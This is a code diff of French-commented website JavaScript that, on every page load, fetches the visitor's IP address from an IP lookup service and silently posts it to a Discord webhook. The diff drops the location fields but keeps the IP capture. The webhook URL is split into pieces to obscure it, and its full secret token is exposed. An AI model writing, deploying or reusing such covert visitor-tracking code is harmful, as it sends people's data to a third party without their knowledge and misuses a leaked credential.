@@ -1,12 +1,12 @@
 // Fonction pour envoyer une requête POST au webhook Discord
-function sendToDiscord(ip, location) {
+function sendToDiscord(ip) {
     const part1 = "https://discord.com/api/webhooks/";
     const part2 = "1255583928014733323/";
     const part3 = "tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
     const webhookUrl = part1 + part2 + part3;
     
     const message = {
-        content: `Nouvel visiteur sur le site.\nAdresse IP: ${ip}\nLocalisation approximative: ${location}`
+        content: `Nouvel visiteur sur le site.\nAdresse IP: ${ip}`
     };
 
     fetch(webhookUrl, {
@@ -26,22 +26,20 @@ function sendToDiscord(ip, location) {
     .catch(error => console.error('Error:', error));
 }
 
-// Fonction pour obtenir l'adresse IP et la localisation approximative de l'utilisateur
-function getUserIPAndLocation() {
+// Fonction pour obtenir l'adresse IP de l'utilisateur
+function getUserIP() {
     fetch('https://ip-api.com/json')
         .then(response => response.json())
         .then(data => {
             console.log(data); // Inspecter la structure de la réponse
-            const ip = data.query; // Cela devrait être 'data.query' si 'query' est l'attribut correct pour l'IP
-            const location = `${data.city}, ${data.regionName}, ${data.country}`;
+            const ip = data.query; // Récupérer l'adresse IP
             console.log('User IP:', ip);
-            console.log('Location:', location);
-            sendToDiscord(ip, location);
+            sendToDiscord(ip); // Envoyer l'adresse IP au webhook Discord
         })
-        .catch(error => console.error('Error fetching IP and location:', error));
+        .catch(error => console.error('Error fetching IP:', error));
 }
 
-// Exécuter la fonction getUserIPAndLocation lorsque le document est complètement chargé
+// Exécuter la fonction getUserIP lorsque le document est complètement chargé
 window.onload = function() {
-    getUserIPAndLocation();
+    getUserIP();
 };
